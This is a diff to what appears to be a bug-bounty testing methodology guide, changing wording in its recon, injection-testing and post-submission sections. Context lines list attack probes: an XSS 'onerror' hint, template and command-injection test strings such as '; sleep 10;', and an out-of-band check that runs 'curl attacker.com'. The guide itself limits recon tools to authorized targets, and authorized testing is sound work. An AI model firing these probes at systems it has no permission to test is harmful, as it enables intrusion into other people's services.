@@ -54,7 +54,7 @@ Before touching any tool:
 - `<script>` blocked? Try `<img onerror=...>`
 
 **Reverse-engineer developer psychology:**
-- Feature A has auth checks -> Similar feature B (newly added) probably doesn't
+- Feature A has auth checks -> newly added Feature B -> verify the auth boundary directly
 - Complex flows (coupon + points + refund) -> Edge cases have bugs
 - `/api/v2/user` exists -> Does `/api/v1/user` still work with weaker auth?
 
@@ -195,7 +195,7 @@ Google Dorks -> JS file download -> Hidden param discovery -> API mapping
 | Live subdomains with tech stack | Phase 2 (Mapping) |
 | Known software (WordPress, Jira) | Check CVEs + defaults immediately |
 | Cloud resources (S3, Firebase) | Test permissions (read/write/list) |
-| Nothing after 5 min on a host | Skip, try next host (5-minute rule) |
+| Nothing after 5 min on a host | Skip; probe next host (5-minute rule) |
 
 See `do:security-recon` — recon tools run only against authorized local targets; public
 hosts get scope analysis and report writing only.
@@ -247,11 +247,11 @@ What input are you testing?
 +-- Template / wiki editor
 |   -> SSTI
 +-- Nothing obvious
-    -> Fuzz with ffuf, try Error-based probing
+    -> Fuzz with ffuf, run Error-based probing
 ```
 
 **Error vs Blind decision:**
-1. Try Error-based first (send `'`, `"`, `{{7*7}}`, `${7*7}`) — watch for 500 errors, stack traces
+1. Run Error-based first (send `'`, `"`, `{{7*7}}`, `${7*7}`) — watch for 500 errors, stack traces
 2. No error? Time-based (`SLEEP(10)`, `; sleep 10;`) — watch response time
 3. No time diff? OOB (`curl attacker.com`, interactsh) — watch for DNS callback
 4. Still nothing? Boolean (`AND 1=1` vs `AND 1=0`) — watch content-length diff
@@ -325,7 +325,7 @@ Report shape:
 ```
 
 **After submission:**
-- [ ] While waiting for triage: try to escalate further (A->B signal method)
+- [ ] While waiting for triage: run the A->B escalation check
 - [ ] If fix deployed: re-test for bypass (incomplete patch = new bug)
 - [ ] Record finding in your engagement log
 
